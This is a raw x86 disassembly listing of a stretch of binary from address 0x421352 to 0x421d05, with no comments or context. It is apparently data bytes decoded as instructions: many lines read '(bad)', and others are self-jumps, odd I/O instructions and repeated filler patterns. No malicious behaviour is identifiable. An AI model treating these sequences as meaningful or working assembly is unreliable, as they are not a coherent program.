  421352:	(bad)  
  421353:	fs jge 0x421354
  421356:	dec    esp
  421357:	pop    edi
  421358:	jge    0x421358
  42135a:	fcom   DWORD PTR [edi+0x0]
	...
  421385:	add    BYTE PTR [ebp-0x2],bh
  421388:	jp     0x4213d8
  42138a:	jge    0x42138a
  42138c:	clc    
  42138d:	xchg   BYTE PTR [ebp-0x2],bh
  421390:	push   edx
  421391:	mov    DWORD PTR [ebp-0x2],edi
  421394:	(bad)  
  421398:	rol    DWORD PTR [ecx-0x68c40183],1
  42139e:	jge    0x42139e
  4213a0:	push   0xffffff8f
  4213a2:	jge    0x4213a2
  4213a4:	div    DWORD PTR [esi+0x7d]
  4213a7:	(bad)  
  4213a8:	sub    DWORD PTR es:[ebp-0x2],edi
  4213ac:	pop    ecx
  4213ad:	sub    DWORD PTR [ebp-0x2],edi
  4213b0:	loop   0x4213db
  4213b2:	jge    0x4213b2
  4213b4:	adc    eax,0x44fe7d28
  4213b9:	sub    ch,bh
  4213bb:	std    
  4213bc:	ja     0x4213e6
  4213be:	std    
  4213bf:	std    
  4213c0:	(bad)  
  4213c1:	sub    ch,bh
  4213c3:	std    
  4213c4:	mov    ch,0x2b
  4213c6:	std    
  4213c7:	std    
  4213c8:	aas    
  4213c9:	sub    bh,ch
  4213cb:	std    
  4213cc:	sbb    DWORD PTR [edx+edi*8+0x2a490fd],ebp
  4213d3:	(bad)  
  4213d4:	shr    BYTE PTR [edx+edi*8+0x2a74afd],cl
  4213db:	(bad)  
  4213dc:	mov    bl,0x0
  4213de:	mov    al,ds:0xaf12fd16
  4213e3:	push   ss
  4213e4:	std    
  4213e5:	sbb    DWORD PTR [edi+0x9efd16],0x0
	...
  421414:	sahf   
  421415:	push   ss
  421416:	std    
  421417:	sbb    BYTE PTR [ebp-0x653a02ea],cl
  42141d:	push   ss
  42141e:	std    
  42141f:	sbb    bl,BYTE PTR [ecx-0x97b02ea]
  421425:	push   ss
  421426:	std    
  421427:	call   0xc13f2b02
  42142c:	rcl    BYTE PTR [esi],cl
  42142e:	std    
  42142f:	retf   
  421430:	rcl    BYTE PTR [esi],0xfd
  421433:	or     BYTE PTR [ebp-0x2ae02ea],ch
  421439:	push   ss
  42143a:	std    
  42143b:	lds    ecx,FWORD PTR [ebx+0x17]
  42143e:	std    
  42143f:	push   cs
  421440:	dec    edx
  421441:	pop    ss
  421442:	std    
  421443:	mov    WORD PTR [edx],gs
  421445:	pop    ss
  421446:	std    
  421447:	sti    
  421448:	sbb    dl,BYTE PTR [edi]
  42144a:	std    
  42144b:	jns    0x421496
  42144d:	pop    ss
  42144e:	std    
  42144f:	test   DWORD PTR [ecx+0x17],0x170573fd
  421456:	std    
  421457:	loope  0x42149e
  421459:	pop    ss
  42145a:	std    
  42145b:	adc    dh,BYTE PTR [edi+edx*1]
  42145e:	std    
  42145f:	clc    
  421460:	xor    al,0x17
  421462:	std    
  421463:	sub    DWORD PTR [ebx+0x17],eax
  421466:	std    
  421467:	lds    eax,FWORD PTR [ecx+0x17]
  42146a:	std    
  42146b:	sti    
  42146c:	inc    ecx
  42146d:	pop    ss
  42146e:	std    
  42146f:	xor    DWORD PTR [eax],esi
  421471:	pop    ss
  421472:	std    
  421473:	ins    DWORD PTR es:[edi],dx
  421474:	ds pop ss
  421476:	std    
  421477:	fadd   DWORD PTR [eax]
	...
  4214a1:	add    bl,ch
  4214a3:	sbb    ch,bh
  4214a5:	mov    ebp,0x6afd18f9
  4214aa:	ds pop ds
  4214ac:	sar    edi,0x87
  4214af:	and    al,0xc1
  4214b1:	push   ecx
  4214b3:	repnz add BYTE PTR [eax],al
  4214b6:	repnz add BYTE PTR ds:[eax],al
  4214ba:	repnz add BYTE PTR ds:[eax],al
  4214be:	repnz add BYTE PTR ds:[eax],al
  4214c2:	repnz add BYTE PTR ds:[eax],al
  4214c6:	jge    0x421516
  4214c8:	jmp    0x24a0652f
  4214cd:	dec    eax
  4214ce:	pop    ds
  4214cf:	popa   
  4214d0:	in     al,dx
  4214d1:	dec    DWORD PTR [esi+ebx*2]
  4214d4:	rcl    DWORD PTR [ebx+0x13],0x61
  4214d8:	sub    eax,0xcb61f347
  4214dd:	push   ecx
  4214de:	repnz mov esi,0x4f3e48cb
  4214e4:	call   0xe63c3816
  4214e9:	call   FWORD PTR [edx+0x62]
  4214ec:	adc    bl,BYTE PTR [eax+0x3e]
  4214ef:	es iret 
  4214f1:	jb     0x4214ce
  4214f3:	icebp  
  4214f4:	scas   eax,DWORD PTR es:[edi]
  4214f5:	jcxz   0x421505
  4214f8:	in     eax,dx
  4214f9:	inc    edx
  4214fa:	out    0xe,al
  4214fc:	loopne 0x421570
  4214fe:	rcl    BYTE PTR [esi],cl
  421500:	ret    0xdeff
  421503:	iret   
  421504:	fbld   TBYTE PTR [ebx+0x0]
	...
  42152f:	add    BYTE PTR [eax],bl
  421531:	shl    cl,1
  421533:	jae    0x421573
  421535:	sti    
  421536:	or     DWORD PTR [ebx],ecx
  421538:	inc    esp
  421539:	pop    ds
  42153a:	pop    es
  42153b:	pop    es
  42153c:	pop    esi
  42153d:	sbb    dl,ch
  42153f:	imul   edx,DWORD PTR [ebp+0x5e0a0e12],0x5e6be5ce
  421549:	sti    
  42154a:	and    eax,0x75b5e2f
  42154f:	or     DWORD PTR [edx+edx*2],esi
  421552:	push   eax
  421553:	loop   0x421576
  421555:	push   edx
  421556:	loopne 0x42157b
  421558:	pop    ebp
  421559:	add    DWORD PTR [eax-0x29],0x6d
  42155d:	cmp    esi,eax
  42155f:	and    ebx,DWORD PTR [esi]
  421561:	cmp    eax,DWORD PTR [edx*1+0x23e03b1e]
  421568:	push   ds
  421569:	je     0x4215a9
  42156b:	shl    BYTE PTR [edx+0x3b],1
  42156e:	lock or BYTE PTR [esi],bl
  421571:	jb     0x421584
  421573:	out    dx,eax
  421574:	xor    al,0x51
  421576:	(bad)  
  421577:	fistp  WORD PTR [edi+ebp*2]
  42157a:	(bad)  
  42157b:	or     al,0x5e
  42157d:	cmp    ecx,esp
  42157f:	adc    ebx,DWORD PTR [esi+0x5b]
  421582:	(bad)  
  421583:	and    ebx,DWORD PTR [esi+0x3b]
  421586:	leave  
  421587:	and    BYTE PTR [edi],cl
  421589:	cmp    edi,eax
  42158b:	and    ebx,DWORD PTR [esi+0x5b]
  42158e:	(bad)  
  421590:	sbb    al,0x6f
  421592:	retf   
  421593:	push   ss
	...
  4215bc:	add    BYTE PTR [eax],al
  4215be:	dec    esp
  4215bf:	sub    eax,0x5ae5e7cb
  4215c4:	out    0x3,eax
  4215c6:	ds pop ebx
  4215c8:	out    0x3,eax
  4215ca:	ds pop ebx
  4215cc:	out    0x3,eax
  4215ce:	ds pop ebx
  4215d0:	out    0x3,eax
  4215d2:	ds pop ebx
  4215d4:	out    0x3,eax
  4215d6:	ds pop ebx
  4215d8:	out    0x3,eax
  4215da:	ds pop ebx
  4215dc:	out    0x3,eax
  4215de:	ds pop ebx
  4215e0:	out    0x3,eax
  4215e2:	ds pop ebx
  4215e4:	out    0x3,eax
  4215e6:	ds pop ebx
  4215e8:	out    0x3,eax
  4215ea:	ds pop ebx
  4215ec:	out    0x3,eax
  4215ee:	ds pop ebx
  4215f0:	add    cl,ch
  4215f2:	cmp    eax,0x3de9005b
  4215f7:	pop    ebx
  4215f8:	add    cl,ch
  4215fa:	cmp    eax,0x3de9005b
  4215ff:	pop    ebx
  421600:	add    cl,ch
  421602:	cmp    eax,0x3de9005b
  421607:	pop    ebx
  421608:	add    cl,ch
  42160a:	cmp    eax,0x3de9005b
  42160f:	pop    ebx
  421610:	add    cl,ch
  421612:	cmp    eax,0x3de9005b
  421617:	pop    ebx
  421618:	add    cl,ch
  42161a:	cmp    eax,0x3de9005b
  42161f:	pop    ebx
  421620:	add    cl,ch
	...
  42164a:	add    BYTE PTR [eax],al
  42164c:	cmp    eax,0x3de9005b
  421651:	pop    ebx
  421652:	add    cl,ch
  421654:	cmp    eax,0x3de9005b
  421659:	pop    ebx
  42165a:	add    cl,ch
  42165c:	cmp    eax,0x3de9005b
  421661:	pop    ebx
  421662:	add    cl,ch
  421664:	cmp    eax,0x3de9005b
  421669:	pop    ebx
  42166a:	add    cl,ch
  42166c:	cmp    eax,0x3de9005b
  421671:	pop    ebx
  421672:	add    cl,ch
  421674:	cmp    eax,0x3de9005b
  421679:	pop    ebx
  42167a:	add    cl,ch
  42167c:	cmp    eax,0x3de9005b
  421681:	pop    ebx
  421682:	add    cl,ch
  421684:	cmp    eax,0x3de9005b
  421689:	pop    ebx
  42168a:	add    cl,ch
  42168c:	cmp    eax,0x3de9005b
  421691:	pop    ebx
  421692:	add    BYTE PTR [eax],al
  421694:	pop    ss
  421695:	pop    esi
  421696:	add    BYTE PTR [eax],al
  421698:	pop    ss
  421699:	pop    esi
  42169a:	add    BYTE PTR [eax],al
  42169c:	daa    
  42169d:	pop    esi
  42169e:	add    BYTE PTR [eax],al
  4216a0:	daa    
  4216a1:	pop    esi
  4216a2:	add    BYTE PTR [eax],al
  4216a4:	pop    ss
  4216a5:	pop    esi
  4216a6:	add    BYTE PTR [eax],al
  4216a8:	pop    ss
  4216a9:	pop    esi
  4216aa:	add    BYTE PTR [eax],al
  4216ac:	out    0x5d,eax
	...
  4216da:	out    0x5d,eax
  4216dc:	add    BYTE PTR [eax],al
  4216de:	xlat   BYTE PTR ds:[ebx]
  4216df:	pop    ebp
  4216e0:	add    BYTE PTR [eax],al
  4216e2:	xlat   BYTE PTR ds:[ebx]
  4216e3:	pop    ebp
  4216e4:	add    BYTE PTR [eax],al
  4216e6:	out    0x5d,eax
  4216e8:	add    BYTE PTR [eax],al
  4216ea:	out    0x5d,eax
  4216ec:	add    BYTE PTR [eax],al
  4216ee:	xlat   BYTE PTR ds:[ebx]
  4216ef:	pop    ebp
  4216f0:	add    BYTE PTR [eax],al
  4216f2:	xlat   BYTE PTR ds:[ebx]
  4216f3:	pop    ebp
  4216f4:	add    BYTE PTR [eax],al
  4216f6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4216f7:	pop    ebp
  4216f8:	add    BYTE PTR [eax],al
  4216fa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4216fb:	pop    ebp
  4216fc:	add    BYTE PTR [eax],al
  4216fe:	xchg   edi,eax
  4216ff:	pop    ebp
  421700:	add    BYTE PTR [eax],al
  421702:	xchg   edi,eax
  421703:	pop    ebp
  421704:	add    BYTE PTR [eax],al
  421706:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421707:	pop    ebp
  421708:	add    BYTE PTR [eax],al
  42170a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42170b:	pop    ebp
  42170c:	add    BYTE PTR [eax],al
  42170e:	xchg   edi,eax
  42170f:	pop    ebp
  421710:	add    BYTE PTR [eax],al
  421712:	xchg   edi,eax
  421713:	pop    ebp
  421714:	add    BYTE PTR [eax],al
  421716:	addr16 pop ebp
  421718:	add    BYTE PTR [eax],al
  42171a:	addr16 pop ebp
  42171c:	add    BYTE PTR [eax],al
  42171e:	push   edi
  42171f:	pop    ebp
  421720:	add    BYTE PTR [eax],al
  421722:	push   edi
  421723:	pop    ebp
  421724:	add    BYTE PTR [eax],al
  421726:	addr16 pop ebp
  421728:	add    BYTE PTR [eax],al
  42172a:	addr16 pop ebp
  42172c:	add    BYTE PTR [eax],al
  42172e:	push   edi
  42172f:	pop    ebp
  421730:	add    BYTE PTR [eax],al
  421732:	push   edi
  421733:	pop    ebp
  421734:	add    BYTE PTR [eax],al
  421736:	add    al,BYTE PTR ds:[ecx]
  421739:	add    BYTE PTR [esi],bh
  42173b:	add    al,BYTE PTR [ecx]
	...
  421765:	add    BYTE PTR [eax],al
  421767:	add    BYTE PTR [esi],bh
  421769:	add    al,BYTE PTR [ecx]
  42176b:	add    BYTE PTR [esi],bh
  42176d:	add    al,BYTE PTR [ecx]
  42176f:	add    BYTE PTR [esi],bh
  421771:	add    al,BYTE PTR [ecx]
  421773:	add    BYTE PTR [esi],bh
  421775:	add    al,BYTE PTR [ecx]
  421777:	add    BYTE PTR [esi],bh
  421779:	add    al,BYTE PTR [ecx]
  42177b:	add    BYTE PTR [esi],bh
  42177d:	add    al,BYTE PTR [ecx]
  42177f:	add    BYTE PTR [esi],bh
  421781:	add    al,BYTE PTR [ecx]
  421783:	add    BYTE PTR [esi],bh
  421785:	add    al,BYTE PTR [ecx]
  421787:	add    BYTE PTR [esi],bh
  421789:	add    al,BYTE PTR [ecx]
  42178b:	add    BYTE PTR [esi],bh
  42178d:	add    al,BYTE PTR [ecx]
  42178f:	add    BYTE PTR [esi],bh
  421791:	add    al,BYTE PTR [ecx]
  421793:	add    BYTE PTR [esi],bh
  421795:	add    al,BYTE PTR [ecx]
  421797:	add    BYTE PTR [esi],bh
  421799:	add    al,BYTE PTR [ecx]
  42179b:	add    BYTE PTR [esi],bh
  42179d:	add    al,BYTE PTR [ecx]
  42179f:	add    BYTE PTR [esi],bh
  4217a1:	add    al,BYTE PTR [ecx]
  4217a3:	add    BYTE PTR [esi],bh
  4217a5:	add    al,BYTE PTR [ecx]
  4217a7:	add    BYTE PTR [esi],bh
  4217a9:	add    al,BYTE PTR [ecx]
  4217ab:	add    BYTE PTR [esi],bh
  4217ad:	add    al,BYTE PTR [ecx]
  4217af:	add    BYTE PTR [esi],bh
  4217b1:	add    al,BYTE PTR [ecx]
  4217b3:	add    BYTE PTR [esi],bh
  4217b5:	add    al,BYTE PTR [ecx]
  4217b7:	add    BYTE PTR [esi],bh
  4217b9:	add    al,BYTE PTR [ecx]
  4217bb:	add    BYTE PTR [esi],bh
  4217bd:	add    al,BYTE PTR [ecx]
  4217bf:	add    BYTE PTR [esi],bh
  4217c1:	add    al,BYTE PTR [ecx]
  4217c3:	add    BYTE PTR [esi],bh
  4217c5:	add    esp,DWORD PTR [ebx+eax*2]
  4217c8:	loope  0x421834
  4217ca:	lods   al,BYTE PTR ds:[esi]
  4217cb:	retf   
	...
  4217f4:	add    BYTE PTR [eax],al
  4217f6:	push   ecx
  4217f7:	cmp    BYTE PTR ds:0xacb8b6ba,dh
  4217fd:	xor    DWORD PTR [esi],ebp
  4217ff:	jnp    0x4217ad
  421801:	retf   
  421802:	pop    ecx
  421803:	pop    ebx
  421804:	call   0x67c2152d
  421809:	add    edi,DWORD PTR [esi+0x5b]
  42180c:	mov    DWORD PTR [ebx],0x3df5b4e
  421812:	inc    edx
  421813:	pop    ebx
  421814:	jmp    0xe73a391c
  421819:	add    edi,DWORD PTR [esi+0x7e03e75a]
  42181f:	pop    ebx
  421820:	out    0x3,eax
  421822:	pop    esi
  421823:	pop    ebx
  421824:	out    0x3,eax
  421826:	cs pop ebx
  421828:	out    0x3,eax
  42182a:	inc    esi
  42182b:	pop    ebx
  42182c:	out    0x3,eax
  42182e:	cmp    bl,BYTE PTR [ebx-0x19]
  421831:	add    edi,DWORD PTR [ebx+ebx*2]
  421834:	out    0x3,eax
  421836:	loope  0x42182f
  421838:	out    0x83,al
  42183a:	ds pop ebx
  42183c:	out    0xc3,eax
  42183e:	shl    edi,1
  421840:	out    0x23,al
  421842:	ds pop ebx
  421844:	out    0xf3,eax
  421846:	shl    edi,0xe6
  421849:	or     edi,DWORD PTR [esi]
  42184b:	pop    ebx
  42184c:	out    0xff,eax
  42184e:	mov    cl,0xf7
  421850:	out    0x1,al
  421852:	ds pop ebx
  421854:	out    0x4,eax
  421856:	ds pop ebx
  421858:	addr16 add al,0x0
	...
  421883:	add    BYTE PTR [esi],bh
  421885:	pop    ebx
  421886:	daa    
  421887:	add    al,0x3e
  421889:	pop    ebx
  42188a:	mov    DWORD PTR [ebx],0x3f75b3e
  421890:	ds pop ebx
  421892:	out    dx,eax
  421893:	add    edi,DWORD PTR [esi]
  421895:	pop    ebx
  421896:	jmp    0x42189b
  421898:	ds pop ebx
  42189a:	jmp    0xe89d56a2
  42189f:	add    edi,DWORD PTR [esi]
  4218a1:	pop    ebx
  4218a2:	call   DWORD PTR [ebx]
  4218a4:	cmp    eax,DWORD PTR es:[eax]
  4218a7:	ror    DWORD PTR [ebp+0x5f],1
  4218aa:	add    al,dh
  4218ac:	xor    al,BYTE PTR [eax+0x1f]
  4218af:	add    BYTE PTR [ebx+0x60],cl
  4218b2:	jmp    edx
  4218b4:	dec    edi
  4218b5:	inc    ecx
  4218b6:	and    dh,bl
  4218b8:	das    
  4218b9:	gs add dl,dl
  4218bc:	dec    esp
  4218bd:	inc    esp
  4218be:	and    edi,eax
  4218c0:	xor    eax,DWORD PTR [ebp+0x26]
  4218c3:	fild   QWORD PTR [ebx]
  4218c5:	imul   eax,DWORD PTR [esi],0x23422eb4
  4218cb:	int3   
  4218cc:	push   cs
  4218cd:	bound  eax,QWORD PTR [ebx]
  4218cf:	and    eax,0xfd24472e
  4218d4:	jmp    0xed341d3b
  4218d9:	arpl   WORD PTR [ecx],ax
  4218db:	call   0xf148781f
  4218e0:	aaa    
  4218e1:	addr16 push cs
  4218e3:	out    dx,al
  4218e4:	ror    BYTE PTR [ebx+0x13],cl
  4218e7:	fiadd  WORD PTR [eax]
	...
  421911:	add    dl,dl
  421913:	push   ebx
  421914:	sbb    al,0xdc
  421916:	int    0x64
  421918:	adc    eax,0x195cc1e9
  42191d:	out    dx,eax
  42191e:	ds dec edi
  421920:	pop    es
  421921:	jmp    FWORD PTR [edi-0x570ffe9d]
  421927:	addr16 push es
  421929:	jecxz  0x4218d7
  42192b:	(bad)  
  42192c:	call   eax
  42192e:	sub    al,0x55
  421930:	and    al,0xc7
  421932:	inc    ebx
  421933:	push   edx
  421934:	and    eax,0x2d3b61bb
  421939:	adc    ch,BYTE PTR [edx]
  42193b:	cmp    eax,0x424e0835
  421940:	daa    
  421941:	sbb    BYTE PTR ds:0x69e91d57,bl
  421947:	cmc    
  421948:	(bad)  
  421949:	call   DWORD PTR [edi+0x5a]
  42194c:	add    BYTE PTR [eax],al
  42194e:	addr16 pop edx
  421950:	std    
  421951:	jmp    DWORD PTR [ebx-0xa]
  421954:	std    
  421955:	add    BYTE PTR [ebx+0x5a],ah
  421958:	std    
  421959:	add    BYTE PTR [ebx-0xa],dl
  42195c:	std    
  42195d:	jmp    DWORD PTR [ebx]
  42195f:	pop    edx
  421960:	add    BYTE PTR [eax],al
  421962:	daa    
  421963:	pop    edx
  421964:	std    
  421965:	call   DWORD PTR [edi]
  421967:	idiv   ah
  421969:	call   DWORD PTR [edi]
  42196b:	idiv   ch
  42196d:	add    BYTE PTR [ebx],ah
  42196f:	idiv   ch
  421971:	add    BYTE PTR [edi],ah
  421973:	idiv   ah
  421975:	inc    DWORD PTR [eax]
	...
  42199f:	add    BYTE PTR [ebx],ah
  4219a1:	idiv   ah
  4219a3:	add    BYTE PTR [ebx],dl
  4219a5:	pop    edx
  4219a6:	std    
  4219a7:	add    bh,ah
  4219a9:	pop    ecx
  4219aa:	add    BYTE PTR [ecx],al
  4219ac:	jecxz  0x421a07
  4219ae:	add    BYTE PTR [eax],al
  4219b0:	jecxz  0x4219a7
  4219b2:	cld    
  4219b3:	call   edi
  4219b5:	cmc    
  4219b6:	cld    
  4219b7:	add    bh,ah
  4219b9:	cmc    
  4219ba:	cld    
  4219bb:	add    bh,ah
  4219bd:	cmc    
  4219be:	std    
  4219bf:	call   edi
  4219c1:	cmc    
  4219c2:	std    
  4219c3:	call   edi
  4219c5:	pop    ecx
  4219c6:	std    
  4219c7:	add    BYTE PTR [edi-0x5cff02a7],ah
  4219cd:	cmc    
  4219ce:	cld    
  4219cf:	add    BYTE PTR [ebx-0x6c0002a7],ah
  4219d5:	pop    ecx
  4219d6:	add    BYTE PTR [ecx],al
  4219d8:	mov    ds:0xa3010059,eax
  4219dd:	pop    ecx
  4219de:	std    
  4219df:	call   DWORD PTR [edi-0x6cffffa7]
  4219e5:	cmc    
  4219e6:	cld    
  4219e7:	jmp    DWORD PTR [ebx-0xb]
  4219ea:	std    
  4219eb:	(bad)  
  4219ec:	ds add al,0x1
  4219ef:	add    BYTE PTR [edi],bh
  4219f1:	add    al,0x1
  4219f3:	jmp    DWORD PTR [ecx+0x7]
  4219f6:	std    
  4219f7:	(bad)  
  4219f8:	add    BYTE PTR ds:[ecx],al
  4219fb:	add    BYTE PTR [esi],bh
  4219fd:	add    al,0x1
  4219ff:	(bad)  
  421a00:	ds add al,0xfd
  421a03:	inc    BYTE PTR [eax]
	...
  421a2d:	add    BYTE PTR [esi],bh
  421a2f:	add    al,0x1
  421a31:	add    BYTE PTR [edi],bh
  421a33:	add    al,BYTE PTR [ecx]
  421a35:	add    BYTE PTR [edi],bh
  421a37:	add    bh,ch
  421a39:	jmp    FWORD PTR [ecx]
  421a3b:	inc    DWORD PTR [eax]
  421a3d:	(bad)  
  421a3e:	add    al,BYTE PTR ds:[ecx]
  421a41:	call   FWORD PTR [ecx]
  421a43:	add    edi,ebp
  421a45:	(bad)  
  421a46:	adc    DWORD PTR [edi],eax
  421a48:	add    DWORD PTR [eax],eax
  421a4a:	aas    
  421a4b:	add    bh,ch
  421a4d:	inc    DWORD PTR [ecx]
  421a4f:	pop    es
  421a50:	add    DWORD PTR [eax],eax
  421a52:	ds (bad) 
  421a54:	cld    
  421a55:	(bad)  
  421a56:	ds push es
  421a58:	std    
  421a59:	(bad)  
  421a5a:	jmp    0x3f41175d
  421a5f:	push   es
  421a60:	add    edi,edi
  421a62:	fld    DWORD PTR [edx]
  421a64:	add    edi,edi
  421a66:	ds push es
  421a68:	std    
  421a69:	(bad)  
  421a6a:	inc    BYTE PTR ds:[eax]
  421a6d:	add    BYTE PTR [edi],bh
  421a6f:	push   es
  421a70:	std    
  421a71:	(bad)  
  421a72:	mov    ecx,0xb1fefcfe
  421a77:	add    bh,ch
  421a79:	(bad)  
  421a7a:	ds (bad) 
  421a7c:	cld    
  421a7d:	jmp    DWORD PTR [ecx+0x3efffd02]
  421a83:	add    bh,ch
  421a85:	(bad)  
  421a86:	add    al,BYTE PTR ds:[ecx]
  421a89:	add    BYTE PTR [esi],bh
  421a8b:	inc    BYTE PTR [eax]
  421a8d:	inc    DWORD PTR [ecx+0xffe75b]
	...
  421abb:	add    BYTE PTR [eax-0xc],bh
  421abe:	out    0x3,al
  421ac0:	ds pop ebx
  421ac2:	jmp    0x421ac7
  421ac4:	imul   ebx,DWORD PTR [ebx+0x7],0xe6db4e84
  421acb:	cmp    DWORD PTR [esi],0xffffffdb
  421ace:	out    0x83,al
  421ad0:	ds pop ebx
  421ad2:	pop    es
  421ad3:	test   BYTE PTR [esi],ch
  421ad5:	pop    ebx
  421ad6:	out    0x3,eax
  421ad8:	cs pop ebx
  421ada:	mov    DWORD PTR [ebx],0x3c75b3e
  421ae0:	dec    esi
  421ae1:	fcmovnb st,st(6)
  421ae3:	cmp    DWORD PTR [esi],0xffffffdb
  421ae6:	mov    BYTE PTR [ebx],0x3e
  421ae9:	fcmovnb st,st(6)
  421aeb:	sub    DWORD PTR [esi],0xffffffdb
  421aee:	out    0x83,al
  421af0:	cs (bad) 
  421af3:	add    edi,DWORD PTR [esi]
  421af5:	(bad)  
  421af7:	cmp    DWORD PTR [esi],0xffffffdb
  421afa:	out    0x3,al
  421afc:	dec    esi
  421afd:	pop    ebx
  421afe:	pop    es
  421aff:	add    al,0x3e
  421b01:	pop    ebx
  421b02:	pop    es
  421b03:	add    al,0x4e
  421b05:	(bad)  
  421b07:	or     DWORD PTR [esi+0x5b],0x7
  421b0b:	add    al,0x2e
  421b0d:	pop    ebx
  421b0e:	pop    es
  421b0f:	test   BYTE PTR [esi],bh
  421b11:	(bad)  
  421b13:	add    edi,DWORD PTR [esi]
  421b15:	pop    ebx
  421b16:	out    0x3,eax
  421b18:	ds (bad) 
  421b1b:	cmp    DWORD PTR [esi],0x5b
  421b1e:	mov    DWORD PTR [ebx+0x0],0x0
	...
  421b48:	add    BYTE PTR [eax],al
  421b4a:	dec    esi
  421b4b:	pop    ebx
  421b4c:	out    0x3,eax
  421b4e:	dec    esi
  421b4f:	fcmovnb st,st(6)
  421b51:	add    ecx,DWORD PTR [esi+0x5b]
  421b54:	mov    DWORD PTR [ebx],0x3e6db3e
  421b5a:	ds pop ebx
  421b5c:	add    cl,ch
  421b5e:	mov    ebp,0xbdc9004a
  421b63:	pop    edx
  421b64:	add    cl,ch
  421b66:	mov    ebp,0x3de9804a
  421b6b:	dec    ebx
  421b6c:	or     BYTE PTR [ecx],0xc2
  421b6f:	pop    edx
  421b70:	add    cl,ch
  421b72:	cmp    eax,0xc209005b
  421b77:	dec    edx
  421b78:	add    BYTE PTR [ecx],cl
  421b7a:	cmp    cl,BYTE PTR [ebx-0x80]
  421b7d:	jmp    0x94266bf
  421b82:	mov    edx,0x3de9805a
  421b87:	dec    ebx
  421b88:	sub    cl,0xbd
  421b8b:	dec    ebx
  421b8c:	sub    cl,0xbd
  421b8f:	pop    ebx
  421b90:	add    cl,ch
  421b92:	cmp    eax,0xbde9804b
  421b97:	pop    ebx
  421b98:	or     cl,0x3d
  421b9b:	pop    ebx
  421b9c:	add    cl,cl
  421b9e:	mov    ebp,0xbdc9804b
  421ba3:	dec    ebx
  421ba4:	add    BYTE PTR [ecx],cl
  421ba6:	inc    edx
  421ba7:	pop    ebx
  421ba8:	add    cl,ch
  421baa:	mov    ebp,0xe9005b
	...
  421bd7:	add    BYTE PTR ds:0xba09805b,bh
  421bdd:	pop    ebx
  421bde:	add    cl,ch
  421be0:	mov    ebp,0x3de9804b
  421be5:	dec    ebx
  421be6:	add    BYTE PTR [ecx],cl
  421be8:	inc    edx
  421be9:	pop    ebx
  421bea:	or     BYTE PTR [ecx],0x3a
  421bed:	dec    ebx
  421bee:	add    cl,cl
  421bf0:	mov    ebp,0x3dc9805b
  421bf5:	pop    ebx
  421bf6:	or     cl,0x3d
  421bf9:	dec    ebx
  421bfa:	add    cl,ch
  421bfc:	mov    ebp,0xa700004b
  421c01:	pop    esi
  421c02:	add    BYTE PTR [eax],al
  421c04:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421c05:	fdivp  st(7),st
  421c07:	jg     0x421c80
  421c09:	fdivp  st(7),st
  421c0b:	call   DWORD PTR [edi+0x4780005e]
  421c11:	push   edi
  421c12:	adc    BYTE PTR [eax-0x7ff028b9],al
  421c18:	push   edi
  421c19:	fimul  WORD PTR [edi]
  421c1b:	add    BYTE PTR [edi+0x58],bl
  421c1e:	add    BYTE PTR [eax],al
  421c20:	addr16 pop eax
  421c22:	add    cl,BYTE PTR [eax]
  421c24:	addr16 pop esi
  421c26:	add    BYTE PTR [eax],al
  421c28:	pop    edi
  421c29:	pop    esi
  421c2a:	add    cl,BYTE PTR [eax]
  421c2c:	push   edi
  421c2d:	pop    eax
  421c2e:	add    BYTE PTR [eax],cl
  421c30:	daa    
  421c31:	pop    esi
  421c32:	add    BYTE PTR [eax],al
  421c34:	das    
  421c35:	pop    eax
  421c36:	add    al,BYTE PTR [eax]
  421c38:	pop    ss
  421c39:	pop    eax
  421c3a:	add    BYTE PTR [eax],cl
	...
  421c64:	add    BYTE PTR [eax],al
  421c66:	pop    ds
  421c67:	pop    esi
  421c68:	add    al,BYTE PTR [eax]
  421c6a:	divps  xmm0,XMMWORD PTR [eax]
  421c6d:	or     BYTE PTR [edi],cl
  421c6f:	pop    esi
  421c70:	add    BYTE PTR [eax],cl
  421c72:	pop    ss
  421c73:	pop    esi
  421c74:	add    al,BYTE PTR [eax]
  421c76:	pop    ds
  421c77:	pop    eax
  421c78:	add    cl,BYTE PTR [eax]
  421c7a:	out    dx,eax
  421c7b:	pop    ebp
  421c7c:	add    al,BYTE PTR [eax]
  421c7e:	out    0x5d,eax
  421c80:	add    cl,BYTE PTR [eax]
  421c82:	fist   WORD PTR [edi+0x0]
  421c85:	add    bh,dl
  421c87:	pop    ebp
  421c88:	add    BYTE PTR [eax],cl
  421c8a:	iret   
  421c8b:	pop    ebp
  421c8c:	add    BYTE PTR [eax],al
  421c8e:	out    0x57,eax
  421c90:	add    cl,BYTE PTR [eax]
  421c92:	xlat   BYTE PTR ds:[ebx]
  421c93:	push   edi
  421c94:	add    BYTE PTR [eax],al
  421c96:	xlat   BYTE PTR ds:[ebx]
  421c97:	push   edi
  421c98:	add    al,BYTE PTR [eax]
  421c9a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421c9b:	pop    ebp
  421c9c:	add    cl,BYTE PTR [eax]
  421c9e:	scas   eax,DWORD PTR es:[edi]
  421c9f:	pop    ebp
  421ca0:	add    cl,BYTE PTR [eax]
  421ca2:	ds cld 
  421ca4:	add    al,BYTE PTR [edx]
  421ca6:	ds cld 
  421ca8:	add    al,BYTE PTR [eax]
  421caa:	inc    esi
  421cab:	add    al,0x3
  421cad:	add    bh,BYTE PTR [esi]
  421caf:	add    al,0x1
  421cb1:	add    bh,BYTE PTR [esi]
  421cb3:	cld    
  421cb4:	add    al,BYTE PTR [eax]
  421cb6:	ss cld 
  421cb8:	add    BYTE PTR [eax],al
  421cba:	ds in  al,dx
  421cbc:	add    al,BYTE PTR [edx]
  421cbe:	inc    esi
  421cbf:	add    al,0x3
  421cc1:	add    BYTE PTR [esi],bh
  421cc3:	add    al,0x1
  421cc5:	add    BYTE PTR [esi],dh
  421cc7:	add    al,0x3
  421cc9:	add    al,BYTE PTR [eax]
	...
  421cf3:	add    BYTE PTR [esi+0x4],al
  421cf6:	add    DWORD PTR [eax],eax
  421cf8:	inc    esi
  421cf9:	in     al,dx
  421cfa:	add    BYTE PTR [edx],al
  421cfc:	ds cld 
  421cfe:	add    al,BYTE PTR [eax]
  421d00:	ds add al,0x1
  421d03:	add    bh,BYTE PTR [esi]
  421d05:	add    al,BYTE PTR [ebx]
